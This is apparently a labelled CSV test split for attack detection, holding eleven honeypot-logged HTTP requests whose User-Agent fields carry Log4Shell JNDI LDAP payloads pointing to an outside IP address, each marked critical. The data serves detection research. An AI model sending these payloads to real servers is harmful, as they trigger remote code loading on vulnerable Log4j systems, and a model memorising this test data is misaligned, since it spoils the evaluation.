id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004370,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2673463270/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2673463270/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004371,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2261905984/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2261905984/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004372,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2769703975/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2769703975/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004373,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/3165023819/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/3165023819/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004374,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2808300507/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2808300507/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004375,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2682193288/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2682193288/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004376,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2310558946/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2310558946/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004377,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/c/2319715482/4443/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/c/2319715482/4443/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004378,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2994790553/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2994790553/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004379,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2808300507/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2808300507/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
LS-004380,2026-05-17,honeynet_log4shell,Request from User-Agent: ${jndi:ldap://162.55.90.26/2769703975/8080/C} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://162.55.90.26/2769703975/8080/c} | method: get | host: external-feed | path: /,1,log4shell,plain,external,external_greedybear_test,critical
